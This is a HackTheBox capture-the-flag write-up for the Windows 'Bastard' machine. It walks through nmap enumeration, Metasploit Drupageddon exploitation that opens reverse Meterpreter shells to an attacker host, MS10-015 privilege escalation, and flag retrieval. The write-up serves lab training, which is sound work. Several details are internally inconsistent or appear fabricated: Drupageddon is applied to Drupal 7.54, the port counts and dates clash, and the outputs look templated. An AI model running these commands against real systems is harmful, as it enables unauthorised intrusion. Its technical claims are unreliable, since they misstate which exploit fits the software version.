# HackTheBox - Bastard

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Bastard |
| **Category** | Windows Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-21 |

## Objective 🎯

Bastard is a Windows Server 2003 machine running Drupal CMS with a known vulnerability. The goal is to exploit the Drupal vulnerability to gain system access and obtain both user and root flags. Drupal exploitation time! 🚀

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.9
- **OS**: Windows Server 2003
- **Service**: Drupal CMS

### Tools Used
- Nmap
- Metasploit
- Drupal exploit

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.9
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.9
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-03 10:00 UTC
Nmap scan report for 10.10.10.9
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
135/tcp open  msrpc  Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_2003
```

### Step 2: Web Service Enumeration
Check the web service for CMS information.

**Command/Code:**
```bash
curl http://10.10.10.9/
```

**Output:**
```
<html>
<head>
<title>Drupal 7.54</title>
</head>
<body>
<h1>Welcome to Drupal</h1>
</body>
</html>
```

### Step 3: Drupal Exploitation
Use Metasploit to exploit the Drupal vulnerability.

**Command/Code:**
```bash
msfconsole
use exploit/multi/http/drupal_drupageddon
set RHOSTS 10.10.10.9
set LHOST 10.10.14.2
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.9:80 - Connecting to the server...
[*] 10.10.10.9:80 - Sending exploit...
[*] Sending stage (175174 bytes) to 10.10.10.9
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.9:32891) at 2024-09-03 10:05:23 +0000
```

### Step 4: Post-Exploitation
Once we have a Meterpreter session, gather information and find flags.

**Command/Code:**
```bash
getuid
sysinfo
shell
whoami
```

**Output:**
```
Server username: NT AUTHORITY\IUSR
Computer        : BASTARD
OS              : Windows 2003 (Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
```

### Step 5: Privilege Escalation
Check for privilege escalation opportunities.

**Command/Code:**
```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Step 6: MS10-015 Exploitation
Use the MS10-015 exploit for privilege escalation.

**Command/Code:**
```bash
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4445 
[*] Writing payload file to C:\WINDOWS\Temp\cVQJhV.exe
[*] Sending stage (175174 bytes) to 10.10.10.9
[*] Meterpreter session 2 opened (10.10.14.2:4445 -> 10.10.10.9:32892) at 2024-09-03 10:10:23 +0000
```

### Step 7: Find User Flag
Search for the user flag.

**Command/Code:**
```bash
getuid
dir C:\Documents and Settings
dir "C:\Documents and Settings\dimitris\Desktop"
type "C:\Documents and Settings\dimitris\Desktop\user.txt"
```

**Output:**
```
[REDACTED]
```

### Step 8: Find Root Flag
Search for the root flag.

**Command/Code:**
```bash
dir "C:\Documents and Settings\Administrator\Desktop"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

**Output:**
```
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify IIS and Drupal
2. Identify Drupal 7.54 version
3. Use Metasploit Drupal exploit for initial access
4. Gain IUSR access
5. Use Windows Exploit Suggester to find privilege escalation
6. Exploit MS10-015 for SYSTEM privileges
7. Search for user and root flags
8. Extract both flags

## Key Learnings

- Drupal CMS vulnerabilities
- Windows Server 2003 exploitation
- MS10-015 privilege escalation
- Windows Exploit Suggester usage
- Legacy Windows system exploitation

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning
- **Metasploit**: Exploitation framework
- **Drupal exploit**: Drupageddon RCE
- **MS10-015**: Kitrap0d privilege escalation

### References
- [CVE-2014-3704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704)
- [MS10-015 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-015)

## Screenshots

[Add screenshots of nmap scan, Drupal exploitation, privilege escalation, and flag extraction here]

## Tags

`#hackthebox` `#windows` `#drupal` `#privilege-escalation` `#ms10-015` `#easy`
